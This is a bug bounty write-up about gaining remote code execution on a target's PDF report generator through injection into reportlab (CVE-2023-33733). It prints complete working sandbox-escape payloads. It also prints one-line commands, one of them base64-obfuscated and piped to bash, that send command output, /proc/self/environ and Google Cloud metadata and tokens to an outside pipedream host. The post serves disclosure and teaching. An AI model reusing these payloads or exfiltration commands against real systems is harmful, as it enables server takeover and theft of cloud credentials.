<p>And recently this where with rootxharsh and iamnooob managed to pwn a target : https://twitter.com/sudhanshur705/status/1694404470317420708</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/ba087bbb-cf88-4c40-b2cf-7ab3c20178af" alt="image" /></p>

<p>I found them fascinating because as they most often deal with html which is later converted to pdf via using some library (PrinceXML,reportlab,dompdf,etc) otherwise headlesschrome to take a screenshot then converting it to pdf ,if you manage to get  html/js injection in the html template which is passed to pdf generator process then things get really interesting.</p>

<p>Interesting things ranges from SSRF as with iframe you can try loading internal resources/metadata inside it or even file uri to leak local files. With Javascript you can even use fetch call to to try reading responses from some internal resources often times in such cases  it doesn‚Äôt have a concept of Same origin policy or it‚Äôs disabled for specific reasons.Even there some ways to bypass SOP by having 2 A records one which resolves to the internal IP which you want to reach another one which resolves to public ip of your vps.</p>

<p>You could find details about it here in this ctf challenge by @strellic : https://brycec.me/posts/corctf_2023_challenges#pdf-pal</p>

<p>Quoting it from the writeup above:</p>

<p><em>But the general idea is that we use multiple A records, one with the IP for our server, then one for 0.0.0.0. When the admin bot goes to our domain, it resolves the IP for our server and loads a custom payload page. Then, we kill our server. Then, when it attempts to load a new resource on the same-origin, it can‚Äôt access it at our IP (since our server is dead), and so falls back to 0.0.0.0, reading a localhost resource. Since this is same-origin, we can read the response.</em></p>

<hr />

<p>Back to the reportlab cve finding on my target.</p>

<p>This was the request made when I clicked on the <em>Generate Report</em> button:
<img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/e1e4b5b6-344a-428e-b53d-096d1bb85452" alt="BurpSuiteCommunity_YGtRpwVCRF" /></p>

<p>The generated report was then visible in the application.</p>

<p>I downloaded the pdf and used exiftool to check if I can identify what software they were using in the pdf generation process, but there were no information.</p>

<p>I then added some html code in the <code class="language-plaintext highlighter-rouge">comment</code> parameter</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"&gt;<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">https://myhost</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>I used such payloads to fingerprint the library/browser they might be using to render the html code server side.</p>

<p>I made the changes and when I press the <em>Generate report</em> button the request failed, I checked the response and this error was there:</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/e672ac87-1e5c-415e-ba18-6381c3c74b51" alt="ApplicationFrameHost_smBlNZe91s" /></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
</span><span class="s2">"</span><span class="se">\n</span><span class="s2">paragraph text '&lt;para&gt;Note: &lt;font color=</span><span class="se">\"</span><span class="s2">#484848</span><span class="se">\"</span><span class="s2">&gt;&lt;img src=x&gt;&lt;/font&gt;&lt;/para&gt;' caused exception Parse error: saw &lt;/font&gt; instead of expected &lt;/img&gt;"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>The moment I saw that error I was like woooow !!! I was pretty confident after that I am going to find something critical there.</p>

<p>My input was this exactly <code class="language-plaintext highlighter-rouge">&lt;img src=x&gt;</code>
From the error it seems the server does no sanitization on the user input and directly uses it in the html file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;para&gt;Note: &lt;font color="#484848"&gt;&lt;/font&gt;&lt;/para&gt;
</code></pre></div></div>

<p>Consider `` as a placeholder for the user controllable input, as there is no sanitization I am also able to include arbitrary html which is then passed to pdf generator library to convert it to pdf.</p>

<p>From the error it‚Äôs indicating that the library‚Äôs html parser has failed to parse the provided html due to our input <code class="language-plaintext highlighter-rouge">&lt;img src=x&gt;</code> as it doesn‚Äôt have a matching closing tag.</p>

<p>And upon using this payload a different error message was shown,I also added my host in the src attribute so that when the image tag renders a request will be sent to my server from there the logs should tell me about the <code class="language-plaintext highlighter-rouge">User-Agent</code> from that I can know which library is it. I added onerror attribute also just to see what would happen:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">https://myhost</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>This time another error was triggered:</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/50114e87-8fdc-4420-bf89-0979c7b6115a" alt="ApplicationFrameHost_Wun1vBOWO2" /></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="s2">"</span><span class="se">\n</span><span class="s2">paragraph text '&lt;para&gt;Note: &lt;font color=</span><span class="se">\"</span><span class="s2">#484848</span><span class="se">\"</span><span class="s2">&gt;test</span><span class="se">\"</span><span class="s2">&gt;&lt;img src=https://myhost onerror=alert()&gt;&lt;/font&gt;&lt;/para&gt;' caused exception paraparser: syntax error: invalid attribute name onerror attrMap=['height', 'src', 'valign', 'width']"</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<p>The error message is already very descriptive on where the problem is, the onerror attribute is not in the <code class="language-plaintext highlighter-rouge">attrMap</code> list (consider it a list of whitelisted attribute names) that‚Äôs why the error was triggered.</p>

<p>Then I removed the <em>onerror</em> attribute and tested it to identify the pdf generator library:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: Python-urllib/3.10
</code></pre></div></div>

<p>Woah cool so the backend is python, when it comes to python one of the most popular libraries for generating pdf is reportlab (https://www.reportlab.com/)</p>

<p>I am no alien to reportlab I have tried looking into it‚Äôs source in the past trying to find some 0day in it but failed miserably as I suck at source code review (still learning) but I still got some basic idea about reportlab.
I already had a repo where I pushed reportlab source code , so I copied a part of the error mssg and searched there</p>

<p>Ah nice found a match for <code class="language-plaintext highlighter-rouge">invalid attribute name</code>
https://github.com/search?q=repo%3ASudistark%2Freportlab-diff+%22invalid+attribute+name%22&amp;type=code</p>

<p>https://github.com/Sudistark/reportlab-diff/blob/f6ea20518ca3caafee27ba5301bc9e079972dd98/reportlab/src/reportlab/platypus/paraparser.py#L3080</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">def</span> <span class="nf">getAttributes</span><span class="p">(</span><span class="n">self</span><span class="p">,</span><span class="n">attr</span><span class="p">,</span><span class="n">attrMap</span><span class="p">):</span>
        <span class="n">A</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">attr</span><span class="p">.</span><span class="nf">items</span><span class="p">():</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">self</span><span class="p">.</span><span class="n">caseSensitive</span><span class="p">:</span>
                <span class="n">k</span> <span class="o">=</span> <span class="n">k</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">attrMap</span><span class="p">:</span>
                <span class="n">j</span> <span class="o">=</span> <span class="n">attrMap</span><span class="p">[</span><span class="n">k</span><span class="p">]</span>
                <span class="n">func</span> <span class="o">=</span> <span class="n">j</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                <span class="k">if</span> <span class="n">func</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
                    <span class="c1">#it's a function
</span>                    <span class="n">v</span> <span class="o">=</span> <span class="nf">func</span><span class="p">(</span><span class="n">self</span><span class="p">,</span><span class="n">v</span><span class="p">)</span> <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">func</span><span class="p">,</span><span class="n">_ExValidate</span><span class="p">)</span> <span class="k">else</span> <span class="nf">func</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
                <span class="n">A</span><span class="p">[</span><span class="n">j</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">v</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">_syntax_error</span><span class="p">(</span><span class="sh">'</span><span class="s">invalid attribute name %s attrMap=%r</span><span class="sh">'</span><span class="o">%</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="nf">list</span><span class="p">(</span><span class="nf">sorted</span><span class="p">(</span><span class="n">attrMap</span><span class="p">.</span><span class="nf">keys</span><span class="p">()))))</span>
</code></pre></div></div>

<p>Ok so this exactly matched with the error message that was shown in the webiste.</p>

<p>I was already aware of the RCE cve which came out recently in reportlab.</p>

<p>Elyas shared full details how the payload works so if you are interested checkout his repo: https://github.com/c53elyas/CVE-2023-33733</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nt">&lt;para&gt;&lt;font</span> <span class="na">color=</span><span class="s">"[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"</span><span class="nt">&gt;</span>
                exploit
<span class="nt">&lt;/font&gt;&lt;/para&gt;</span>
</code></pre></div></div>

<p>He explained the sandbox bypass line by line you could try executing in the python console itself along to understand it better.</p>

<p>I tried understanding this payload after reading his writeup it still looked so difficult for me to understand , I then also tried to execute it in python console line by line which later helped a lot.</p>

<hr />

<p>After I confirmed that reportlab is in use.I used the following payload to confirm if it indeed using the vulnerable version or not.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://myhost.com
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;para&gt;</span>
              <span class="nt">&lt;font</span> <span class="na">color=</span><span class="s">"[ [ getattr(pow,Word('__globals__'))['os'].system('curl https://myhost.com') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'"</span><span class="nt">&gt;</span>
                exploit
                <span class="nt">&lt;/font&gt;</span>
            <span class="nt">&lt;/para&gt;</span>
</code></pre></div></div>

<p>Nope it didn‚Äôt worked, the pdf was succesffuly generated but no pingbacks were sent to my server.
I changed curl command to ping,wget in hope of getting a dns interaction atleast but nope.</p>

<p>At this moment  I questioned are they really using the vulnerable version?</p>

<p>I needed to find the answer for this, which could only be done by using a local setup.</p>

<p>Using the same sample vulnerable code which Elyas shared in his repo I could confirm the exploit locally:
https://github.com/c53elyas/CVE-2023-33733/blob/master/code-injection-poc/poc.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">reportlab.platypus</span> <span class="kn">import</span> <span class="n">SimpleDocTemplate</span><span class="p">,</span> <span class="n">Paragraph</span>
<span class="kn">from</span> <span class="n">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
<span class="n">stream_file</span> <span class="o">=</span> <span class="nc">BytesIO</span><span class="p">()</span>
<span class="n">content</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">def</span> <span class="nf">add_paragraph</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s"> Add paragraph to document content</span><span class="sh">"""</span>
    <span class="n">content</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nc">Paragraph</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_document_template</span><span class="p">(</span><span class="n">stream_file</span><span class="p">:</span> <span class="n">BytesIO</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s"> Get SimpleDocTemplate </span><span class="sh">"""</span>
    <span class="k">return</span> <span class="nc">SimpleDocTemplate</span><span class="p">(</span><span class="n">stream_file</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">build_document</span><span class="p">(</span><span class="n">document</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="o">**</span><span class="n">props</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s"> Build pdf document based on elements added in `content`</span><span class="sh">"""</span>
    <span class="n">document</span><span class="p">.</span><span class="nf">build</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="o">**</span><span class="n">props</span><span class="p">)</span>



<span class="n">doc</span> <span class="o">=</span> <span class="nf">get_document_template</span><span class="p">(</span><span class="n">stream_file</span><span class="p">)</span>
<span class="c1">#
# THE INJECTED PYTHON CODE THAT IS PASSED TO THE COLOR EVALUATOR
#[
#    [
#        getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited')
#        for Word in [
#            orgTypeFun(
#                'Word',
#                (str,),
#                {
#                    'mutated': 1,
#                    'startswith': lambda self, x: False,
#                    '__eq__': lambda self, x: self.mutate()
#                    and self.mutated &lt; 0
#                    and str(self) == x,
#                    'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
#                    '__hash__': lambda self: hash(str(self)),
#                },
#            )
#        ]
#    ]
#    for orgTypeFun in [type(type(1))]
#]
</span>
<span class="nf">add_paragraph</span><span class="p">(</span><span class="sh">"""</span><span class="s">
            &lt;para&gt;
              &lt;font color=</span><span class="sh">"</span><span class="s">[ [ getattr(pow,Word(</span><span class="sh">'</span><span class="s">__globals__</span><span class="sh">'</span><span class="s">))[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">].system(</span><span class="sh">'</span><span class="s">touch /tmp/exploited</span><span class="sh">'</span><span class="s">) for Word in [orgTypeFun(</span><span class="sh">'</span><span class="s">Word</span><span class="sh">'</span><span class="s">, (str,), { </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">: 1, </span><span class="sh">'</span><span class="s">startswith</span><span class="sh">'</span><span class="s">: lambda self, x: False, </span><span class="sh">'</span><span class="s">__eq__</span><span class="sh">'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="sh">'</span><span class="s">mutate</span><span class="sh">'</span><span class="s">: lambda self: {setattr(self, </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">, self.mutated - 1)}, </span><span class="sh">'</span><span class="s">__hash__</span><span class="sh">'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and </span><span class="sh">'</span><span class="s">red</span><span class="sh">'"</span><span class="s">&gt;
                exploit
                &lt;/font&gt;
            &lt;/para&gt;</span><span class="sh">"""</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
<span class="nf">build_document</span><span class="p">(</span><span class="n">doc</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/4f8cdcac-9024-4618-9be3-59b9207d2cb0" alt="image" /></p>

<p>You could see the exploit works in reportlab v3.6.12</p>

<p>Let‚Äôs see now what happens in the fixed version:</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/9a10825c-c124-4bda-8729-3f2fff754291" alt="image" /></p>

<p>Saw the error? The exploit failed</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">File</span> <span class="sh">"</span><span class="s">/home/runner/VelvetyFuchsiaCompiler/venv/lib/python3.10/site-packages/reportlab/lib/colors.py</span><span class="sh">"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">931</span><span class="p">,</span> <span class="ow">in</span> <span class="n">__call__</span>
    <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid color value %r</span><span class="sh">'</span> <span class="o">%</span> <span class="n">arg</span><span class="p">)</span>
<span class="nb">ValueError</span><span class="p">:</span> 
<span class="n">paragraph</span> <span class="n">text</span> <span class="sh">'</span><span class="s">&lt;para&gt; &lt;font color=</span><span class="sh">"</span><span class="s">[ [ getattr(pow,Word(</span><span class="se">\'</span><span class="s">__globals__</span><span class="se">\'</span><span class="s">))[</span><span class="se">\'</span><span class="s">os</span><span class="se">\'</span><span class="s">].system(</span><span class="se">\'</span><span class="s">touch /tmp/exploited</span><span class="se">\'</span><span class="s">) for Word in [orgTypeFun(</span><span class="se">\'</span><span class="s">Word</span><span class="se">\'</span><span class="s">, (str,), { </span><span class="se">\'</span><span class="s">mutated</span><span class="se">\'</span><span class="s">: 1, </span><span class="se">\'</span><span class="s">startswith</span><span class="se">\'</span><span class="s">: lambda self, x: False, </span><span class="se">\'</span><span class="s">__eq__</span><span class="se">\'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="se">\'</span><span class="s">mutate</span><span class="se">\'</span><span class="s">: lambda self: {setattr(self, </span><span class="se">\'</span><span class="s">mutated</span><span class="se">\'</span><span class="s">, self.mutated - 1)}, </span><span class="se">\'</span><span class="s">__hash__</span><span class="se">\'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and </span><span class="se">\'</span><span class="s">red</span><span class="se">\'</span><span class="sh">"</span><span class="s">&gt; exploit &lt;/font&gt; &lt;/para&gt;</span><span class="sh">'</span> <span class="n">caused</span> <span class="n">exception</span> <span class="n">Invalid</span> <span class="n">color</span> <span class="n">value</span> <span class="sh">"</span><span class="s">[ [ getattr(pow,Word(</span><span class="sh">'</span><span class="s">__globals__</span><span class="sh">'</span><span class="s">))[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">].system(</span><span class="sh">'</span><span class="s">touch /tmp/exploited</span><span class="sh">'</span><span class="s">) for Word in [orgTypeFun(</span><span class="sh">'</span><span class="s">Word</span><span class="sh">'</span><span class="s">, (str,), { </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">: 1, </span><span class="sh">'</span><span class="s">startswith</span><span class="sh">'</span><span class="s">: lambda self, x: False, </span><span class="sh">'</span><span class="s">__eq__</span><span class="sh">'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="sh">'</span><span class="s">mutate</span><span class="sh">'</span><span class="s">: lambda self: {setattr(self, </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">, self.mutated - 1)}, </span><span class="sh">'</span><span class="s">__hash__</span><span class="sh">'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and </span><span class="sh">'</span><span class="s">red</span><span class="sh">'"</span>
</code></pre></div></div>

<p>In case of old version no error is triggered and in fixed version upon using the same payload an error is triggered.</p>

<p>When I used the same poc in my target no error was shown pdf was generated successfully, which indicated that they are indeed using vulnerable version otherwise an error should have shown.</p>

<p>Recently upon collaborating with @rootxharsh, he had a similar scenario where  curl,wget,ping didn‚Äôt worked so it was concluded that the headless chrome process might be running with sandbox enabled but infact later when @iamnoooob checked the same, he used a reverse shell  and a callback was recieved successfully in no time. So when Harsh checked the shell  to confirm why those curl,wget,ping didn‚Äôt worked he found that curl,wget,ping didn‚Äôt existed on that box . Shit happens!!</p>

<p>As in my case also curl,etc didn‚Äôt worked, I thought why not try using python requests module instead.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="n">font</span> <span class="n">color</span><span class="o">=</span><span class="sh">"</span><span class="s">[ [ [ [ ftype(ctype(0, 0, 0, 0, 3, 67, b</span><span class="sh">'</span><span class="s">t</span><span class="se">\\</span><span class="s">x00d</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x83</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">xa0</span><span class="se">\\</span><span class="s">x01d</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">xa1</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x00d</span><span class="se">\\</span><span class="s">x00S</span><span class="se">\\</span><span class="s">x00</span><span class="sh">'</span><span class="s">, (None, </span><span class="sh">'</span><span class="s">requests</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">https://myhost</span><span class="sh">'</span><span class="s">), (</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="s">get</span><span class="sh">'</span><span class="s">), (), </span><span class="sh">'</span><span class="s">&lt;stdin&gt;</span><span class="sh">'</span><span class="s">, </span><span class="sh">''</span><span class="s">, 1, b</span><span class="sh">'</span><span class="se">\\</span><span class="s">x12</span><span class="se">\\</span><span class="s">x01</span><span class="sh">'</span><span class="s">), {})() for ftype in [type(lambda: None)] ] for ctype in [type(getattr(lambda: {None}, Word(</span><span class="sh">'</span><span class="s">__code__</span><span class="sh">'</span><span class="s">)))] ] for Word in [orgTypeFun(</span><span class="sh">'</span><span class="s">Word</span><span class="sh">'</span><span class="s">, (str,), { </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">: 1, </span><span class="sh">'</span><span class="s">startswith</span><span class="sh">'</span><span class="s">: lambda self, x: False, </span><span class="sh">'</span><span class="s">__eq__</span><span class="sh">'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="sh">'</span><span class="s">mutate</span><span class="sh">'</span><span class="s">: lambda self: {setattr(self, </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">, self.mutated - 1)}, </span><span class="sh">'</span><span class="s">__hash__</span><span class="sh">'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and </span><span class="sh">'</span><span class="s">red</span><span class="sh">'"</span><span class="o">&gt;</span><span class="n">exploit</span><span class="o">&lt;/</span><span class="n">font</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>I replaced only this part:
https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">touch /tmp/exploited</span><span class="sh">'</span><span class="p">),</span> <span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">)</span>
<span class="o">+</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sh">'</span><span class="s">requests</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https://myhost</span><span class="sh">'</span><span class="p">),</span> <span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">get</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<p>Pretty cool upon using this payload, I recieved a pingback on my server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: python-requests/2.31.0
</code></pre></div></div>
<p>This confirmed that I could execute arbitrary code on the system. I needed some more info before I write the report.</p>

<p>I modified the poc and relied upon this to send the command output to my server</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s2">"import requests;requests.get('https://en2celq7rewbul.m.pipedream.net/</span><span class="si">$(</span><span class="nb">id</span><span class="si">)</span><span class="s2">')"</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/a9eda569-8d47-4d15-a8bb-ef24c5fafddb" alt="image" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s2">"import requests;requests.get('https://en2celq7rewbul.m.pipedream.net/</span><span class="si">$(</span><span class="nb">cat</span> /proc/self/environ<span class="si">)</span><span class="s2">')"</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">echo cHl0aG9uMyAtYyAiaW1wb3J0IHJlcXVlc3RzO3JlcXVlc3RzLmdldCgnaHR0cHM6Ly9lbjJjZWxyN3Jld2J1bC5tLnBpcGVkcmVhbS5uZXQvJChjYXQgL3Byb2Mvc2VsZi9lbnZpcm9uKScpIg== | base64 -d|bash</span><span class="sh">'</span><span class="p">),</span> <span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;font</span> <span class="na">color=</span><span class="s">"[ [ [ [ ftype(ctype(0, 0, 0, 0, 3, 67, b't\\x00d\\x01\\x83\\x01\\xa0\\x01d\\x02\\xa1\\x01\\x01\\x00d\\x00S\\x00', (None, 'os', 'echo cHl0aG9uMyAtYyAiaW1wb3J0IHJlcXVlc3RzO3JlcXVlc3RzLmdldCgnaHR0cHM6Ly9lbjJjZWxyN3Jld2J1bC5tLnBpcGVkcmVhbS5uZXQvJChjYXQgL3Byb2Mvc2VsZi9lbnZpcm9uKScpIg== | base64 -d|bash'), ('__import__', 'system'), (), '&lt;stdin&gt;', '', 1, b'\\x12\\x01'), {})() for ftype in [type(lambda: None)] ] for ctype in [type(getattr(lambda: {None}, Word('__code__')))] ] for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'"</span><span class="nt">&gt;</span>exploit<span class="nt">&lt;/font&gt;</span>
</code></pre></div></div>

<p>The content of /proc/self/environ were really really sensitive , I submitted the report at this moment. As this server responsible for generating pdfs was hosted on Google Cloud , I could even fetch Metadata response also.</p>

<p>To confirm this I used the below payload:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s2">"import requests;import base64;metadata_url = 'http://169.254.169.254/computeMetadata/v1/instance/?recursive=true';metadata_headers = {'Metadata-Flavor': 'Google'};response = requests.get(metadata_url, headers=metadata_headers);encoded_metadata = base64.b64encode(response.text.encode()).decode();target_server_url = 'https://en2celq7rewbul.m.pipedream.net/';data_payload = {'metadata': encoded_metadata};requests.post(target_server_url, json=data_payload)"</span>
</code></pre></div></div>

<p>Beautified one line code for you :)</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">base64</span>

<span class="n">metadata_url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://169.254.169.254/computeMetadata/v1/instance/?recursive=true</span><span class="sh">'</span>

<span class="n">metadata_headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">Metadata-Flavor</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Google</span><span class="sh">'</span><span class="p">}</span> <span class="c1"># custom metadata header requirement we have RCE so we could add it easily ;)
</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">metadata_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">metadata_headers</span><span class="p">)</span>

<span class="n">encoded_metadata</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>

<span class="n">target_server_url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">https://en2celq7rewbul.m.pipedream.net/</span><span class="sh">'</span>

<span class="n">data_payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">metadata</span><span class="sh">'</span><span class="p">:</span> <span class="n">encoded_metadata</span><span class="p">}</span>

<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">target_server_url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data_payload</span><span class="p">)</span>
</code></pre></div></div>

<p>The above code basically makes a request to the Google cloud Metadata Endpoint then sends the json response to my server (which is base64 encoded), at last I also confirmed if I could fetch access_token for the used serviceAccount.</p>

<p>After confirming all this I ceased my testing and reported everything to the program.</p>

<p>The program was really happy with the report, although their maximum payout was 3k they still paid this 4.5k for this bug</p>

